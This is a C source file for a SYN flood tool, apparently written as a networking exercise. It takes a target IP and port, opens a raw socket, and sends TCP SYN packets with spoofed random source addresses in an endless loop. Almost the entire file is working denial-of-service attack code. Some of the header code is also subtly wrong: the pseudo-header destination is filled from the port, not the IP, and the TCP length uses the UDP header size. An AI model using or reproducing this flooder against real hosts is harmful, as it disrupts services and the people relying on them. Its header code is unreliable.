#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<unistd.h>

#include "header.h"



#define SOURCE_PORT 1234
#define TEST_STRING "I AM THE BEST HACKER IN THE WORLD, BETTER THAN TH30 BARRE" //a test string as packet payload
#define PACKET_LENGTH 4096
#define TIME_PAUSE 10

int create_socket();
int config_headers(struct iphdr *iph, struct tcphdr *tcph, struct pseudo_tcp_header *psh_ptr, char *data);

char *dest_ip;
int dest_port;


int main(int argc, char *argv[]) {

	if (argc < 3) {
		printf("ERROR : ARGUMENTS MISSING ( ./syn_flooding [IP_ADDR] [PORT] )\n");
		return 1;
	};

	dest_ip = argv[1];
	dest_port = atoi(argv[2]);

	int sockfd = create_socket();

	char packet[PACKET_LENGTH], *data;
	memset(packet, 0, PACKET_LENGTH);

	/* Creation of headers */
	struct iphdr *iph = (struct iphdr *)packet; //IP header pointer
	struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr)); //TCP header pointer
	struct pseudo_tcp_header psh;


	//data section pointer
	char data_string[] = TEST_STRING;
	data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);
	strncpy(data, data_string, strlen(data_string));


	//Destination identity
	struct sockaddr_in dest;
	memset(&dest, 0, sizeof(dest));
	dest.sin_family = AF_INET;
	dest.sin_port = htons(dest_port);
	inet_pton(AF_INET, dest_ip, &(dest.sin_addr));

	int spam_count = 0;

	while (1) {
		printf("SPAM COUNTER : %d\n", spam_count++);

		//Add value to the structures attributes and calculate checksums
		config_headers(iph, tcph, &psh, data);

		//Send the packet
		if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *)&dest, sizeof(struct sockaddr)) == -1){
            printf("ERROR : SENDING PACKET\n");
		};

		usleep(TIME_PAUSE);

		memset(packet, 0, PACKET_LENGTH);
	};

	return 0;

}


int create_socket() {
	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

	int on = 1;
	setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on)); //Set options

	return sockfd;
};


int config_headers(struct iphdr *iph, struct tcphdr *tcph, struct pseudo_tcp_header *psh_ptr, char *data) {
	// LIKE TUTO 4

	//Generate a random IP address for us
	char ipa[15];
	char *my_random_ip = ipa;
	memset(my_random_ip, 0, 15);
	sprintf(my_random_ip, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255);

	//fill the IP header here
	//(inspired by https://www.binarytides.com/raw-udp-sockets-c-linux/)
	memset(iph, 0, sizeof(struct iphdr));
	iph->version = 4; //Version of IP (IP4)
	iph->ihl = 5; //Internet Header Length (IHL) --> minimum value 5
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data); // Can't calculate yet
	iph->id = htonl(2349); //Id of this packet
	iph->frag_off = 0; //Fragment offset
	iph->ttl = 255; //Time to live (TTL) --> datagram's lifetime
	iph->protocol = TCP_PROTOCOL; //6 for TCP //https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers//
	iph->check = 0; //Checksum set to 0 at the beginning
	iph->saddr = inet_addr(my_random_ip); //Source IP has to be random
	inet_pton(AF_INET, dest_ip, &(iph->daddr));
	iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr)); //Updating checksum
	//print_ip_header(packet, iph->tot_len);


	//fill the TCP header
		// --> For more info : https://www.tenouk.com/download/pdf/Module43.pdf
	memset(tcph, 0, sizeof(struct tcphdr));
	tcph->th_sport = htons(SOURCE_PORT); //Source port
	tcph->th_dport = htons(dest_port); //Destination port
	tcph->th_seq = htonl(0); //Sequence number
	tcph->th_ack = 0x0000; //Acknowledgment number --> Initialize to 0
	tcph->th_off = 0x5; //Data offset --> Initialize to 5
	tcph->th_x2 = 0x0; //Reserved data – The reserved field is always set to zero.
    tcph->th_flags = TH_SYN; //Control flags
    tcph->th_win = htons(5840); //Window size TCP checksum
    tcph->th_sum = 0; //Checksun
    tcph->th_urp = 0x00; //Urgent pointer

	//fill the TCP pseudo header
		// More info --> https://www.baeldung.com/cs/pseudo-header-tcp
	memset(psh_ptr, 0, sizeof(struct pseudo_tcp_header));
	psh_ptr->source_address = inet_addr(my_random_ip) ;
	psh_ptr->dest_address = htonl(dest_port);
	psh_ptr->reserved = 0; //--> 8 bits of 0
	psh_ptr->protocol = TCP_PROTOCOL; //--> 6 for TCP
	psh_ptr->tcp_length = htons(sizeof(struct udphdr) + strlen(data)); // Can't calculate yet

	//Calculation tcp checksum
	int psize = sizeof(struct pseudo_tcp_header) + sizeof(struct tcphdr) + strlen(data);
	char *pseudogram = (char *)malloc(psize);
	memset(pseudogram, 0, psize);
	memcpy(pseudogram , (char*) psh_ptr , sizeof (struct pseudo_tcp_header));
	memcpy(pseudogram + sizeof(struct pseudo_tcp_header) , tcph , sizeof(struct tcphdr) + strlen(data));
	tcph->th_sum = checksum((unsigned short *) pseudogram, psize);
	free(pseudogram);

	return 0;
};
